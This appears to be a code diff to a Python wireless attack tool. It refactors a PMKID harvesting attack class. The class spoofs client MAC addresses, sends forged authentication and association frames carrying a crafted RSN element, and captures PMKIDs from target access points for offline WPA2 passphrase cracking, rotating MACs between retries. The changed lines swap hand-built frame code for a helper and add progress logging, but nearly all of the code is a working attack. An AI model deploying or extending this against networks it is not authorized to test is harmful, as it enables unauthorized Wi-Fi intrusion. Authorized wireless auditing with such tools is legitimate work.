@@ -35,6 +35,7 @@ from typing import Optional
 from wifit3.engine.models import AccessPoint
 
 from .campaign import Campaign
+from .wps.association import WpsAssociation
 
 logger = logging.getLogger(__name__)
 
@@ -51,17 +52,6 @@ class PmkidFail(enum.Enum):
 def _mac_bytes_to_str(b: bytes) -> str:
     return ":".join(f"{x:02x}" for x in b)
 
-
-# Standard supported rates IE (tag 1). Basic-rate bit (0x80) on the b/g
-# mandatory rates. Encoded in 500 kbps units. The exact menu doesn't
-# matter much — APs only check it's well-formed.
-_SUPPORTED_RATES = bytes([
-    0x82, 0x84, 0x8B, 0x96,         # 1, 2, 5.5, 11 (basic)
-    0x0C, 0x12, 0x18, 0x24,         # 6, 9, 12, 18
-])
-_EXT_SUPPORTED_RATES = bytes([
-    0x30, 0x48, 0x60, 0x6C,         # 24, 36, 48, 54
-])
 
 # Generic WPA2-PSK-CCMP RSN IE used when the AP's own IE is unavailable.
 # Group=CCMP, Pairwise=CCMP, AKM=PSK, no caps.
@@ -174,6 +164,7 @@ class PmkidHarvestAttack(Campaign):
         source_mac: Optional[bytes] = None,
         attempts: int = 3,
         m1_timeout: float = 2.0,
+        log=None,
     ):
         super().__init__(ap=target, iface=iface)
         self.target = target
@@ -181,6 +172,9 @@ class PmkidHarvestAttack(Campaign):
         self.source_mac = source_mac or _random_client_mac()
         self.attempts = attempts
         self.m1_timeout = m1_timeout
+        # Plain-string progress sink (UI wraps each line in treelog.branch); the
+        # engine stays markup-free. Defaults to a no-op for headless callers/tests.
+        self.log = log or (lambda m: None)
         # Set by _loop on failure to the specific cause (PMF / PMKID-less M1 /
         # silent), so the UI reports why instead of guessing.
         self.fail_reason: Optional[PmkidFail] = None
@@ -208,53 +202,6 @@ class PmkidHarvestAttack(Campaign):
         self.iface.register_forged_mac(self.source_mac)
 
     # ---- Frame builders -----------------------------------------------------
-
-    def _build_auth_req(self) -> bytes:
-        """802.11 Authentication Request (Open System, seq=1)."""
-        # FC: type=mgmt(0), subtype=auth(0x0B) → 0xB0
-        mac_hdr = (
-            b"\xb0\x00"                         # FC
-            + b"\x00\x00"                       # Duration
-            + self.bssid_bytes                  # Addr1 = BSSID (dest)
-            + self.source_mac                   # Addr2 = us (source)
-            + self.bssid_bytes                  # Addr3 = BSSID
-            + b"\x00\x00"                       # Seq (hardware fills)
-        )
-        # Auth body: algo=0 (Open), seq=1, status=0
-        body = b"\x00\x00" + b"\x01\x00" + b"\x00\x00"
-        return mac_hdr + body
-
-    def _build_assoc_req(self) -> bytes:
-        """802.11 Association Request carrying SSID + rates + RSN IE."""
-        # FC: type=mgmt(0), subtype=assoc_req(0x00) → 0x00
-        mac_hdr = (
-            b"\x00\x00"
-            + b"\x00\x00"
-            + self.bssid_bytes
-            + self.source_mac
-            + self.bssid_bytes
-            + b"\x00\x00"
-        )
-        # Capability Info (2B LE) — ESS + Privacy.
-        cap_info = struct.pack("<H", 0x0011)
-        # Listen interval (2B LE).
-        listen_int = struct.pack("<H", 0x0001)
-
-        # Tag 0: SSID. We tolerate hidden / unknown SSIDs by sending zero-length
-        # — the AP should still respond on its BSSID. Most APs require the
-        # real SSID though, so prefer it if we have one.
-        ssid = (self.target.ssid or "").encode("utf-8", errors="ignore")[:32]
-        ssid_ie = bytes([0x00, len(ssid)]) + ssid
-
-        # Tag 1: Supported Rates
-        rates_ie = bytes([0x01, len(_SUPPORTED_RATES)]) + _SUPPORTED_RATES
-        # Tag 50: Extended Supported Rates
-        ext_rates_ie = bytes([0x32, len(_EXT_SUPPORTED_RATES)]) + _EXT_SUPPORTED_RATES
-
-        # Tag 48: RSN IE — a single forced AKM=PSK over the AP's ciphers (built in
-        # run()); generic PSK-CCMP if we had no usable AP IE.
-        body = cap_info + listen_int + ssid_ie + rates_ie + ext_rates_ie + self._assoc_rsn_ie
-        return mac_hdr + body
 
     def _build_deauth(self) -> bytes:
         """802.11 Deauthentication (reason 3 = STA leaving) from our forged MAC to
@@ -337,9 +284,8 @@ class PmkidHarvestAttack(Campaign):
 
         # Active-monitor (HW-ACK our forged MAC) lets the AP treat us as a real STA
         # and reliably emit M1. set_fake_mac returns None when the card lacks the
-        # FAKE_MAC capability — we just keep going un-ACKed (auth/sleep/assoc as
-        # before). Re-armed per attempt (each rotates the source MAC); teardown()
-        # clears it once.
+        # FAKE_MAC capability — WpsAssociation just runs un-ACKed. Re-armed per
+        # attempt (each rotates the source MAC); teardown() clears it once.
         for attempt in range(1, self.attempts + 1):
             if self.stopped:
                 return
@@ -350,12 +296,19 @@ class PmkidHarvestAttack(Campaign):
                 f"{self.target.bssid} as {_mac_bytes_to_str(self.source_mac)}"
                 f"{' (HW-ACKed)' if armed else ''}"
             )
-            await self.iface.send_raw(self._build_auth_req(), use_no_ack=True)
-            # Tiny pause so the AP processes the Auth before the Assoc lands.
-            await asyncio.sleep(0.1)
-            if self.stopped:               # a Stop between Auth and Assoc lands here
-                return
-            await self.iface.send_raw(self._build_assoc_req(), use_no_ack=True)
+            self.log(f"Auth + Assoc → {self.target.bssid}"
+                     + (f" (retry {attempt})" if attempt > 1 else ""))
+            # Robust auth+assoc (waits for the Auth Resp, resends while silent),
+            # carrying our forged single-AKM=PSK RSN IE as the trailing assoc IE.
+            assoc = WpsAssociation(self.iface, self.target.bssid, self.target.ssid or "",
+                                   self.target.channel, our_mac=self.source_mac,
+                                   assoc_extra_ies=self._assoc_rsn_ie,
+                                   should_stop=lambda: self.stopped)
+            assoc.start()
+            try:
+                await assoc.associate()
+            finally:
+                assoc.stop()
 
             # Poll the parser-populated handshake dict for our forged MAC's M1.
             deadline = time.time() + self.m1_timeout
@@ -373,6 +326,7 @@ class PmkidHarvestAttack(Campaign):
                             f"[PMKID] Harvested {hs.pmkid.hex()} from {self.target.bssid} "
                             f"(STA {_mac_bytes_to_str(self.source_mac)})"
                         )
+                        self.log("M1 received — PMKID present")
                         self.pmkid = hs.pmkid
                         return
                     self.fail_reason = PmkidFail.NO_KDE
@@ -380,12 +334,14 @@ class PmkidHarvestAttack(Campaign):
                         f"[PMKID] {self.target.bssid} answered with a PMKID-less M1 — "
                         f"this AP doesn't expose one; not retrying."
                     )
+                    self.log("M1 received — no PMKID KDE")
                     return
                 await asyncio.sleep(0.05)
 
             logger.info(
                 f"[PMKID] Attempt {attempt}: no M1 (AP silent) — rotating MAC and retrying."
             )
+            self.log("no M1 (AP silent) — rotating MAC")
             self._rotate_mac()
 
         self.fail_reason = PmkidFail.NO_RESPONSE
